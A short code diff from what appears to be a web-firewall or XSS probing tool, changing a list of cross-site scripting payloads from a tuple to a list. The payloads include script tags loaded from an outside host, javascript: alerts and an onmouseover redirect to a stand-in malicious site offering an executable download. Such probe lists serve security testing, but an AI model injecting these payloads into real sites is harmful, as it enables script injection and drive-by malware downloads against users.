@@ -20,14 +20,14 @@ HEADERS = {
         VERSION, sys.version.split(" ")[0], platform.platform().split(" ")[0]
     )
 }
-PAYLOADS = (
+PAYLOADS = [
     "<script src='http://xss.rocks/xss.js'></script>",
     "<img src='javascript:alert(\"XSS\");'>",
     "<script>alert(1);</script>",
     "<b onmouseover=window.location='https://mybadsite.com/download.php?item=pumpedupkicks.exe'>click me!</b>",
     '<iframe src="javascript:prompt(1)">',
     "<xanxss></xanxss>"
-)
+]
 
 
 def load_tampers():
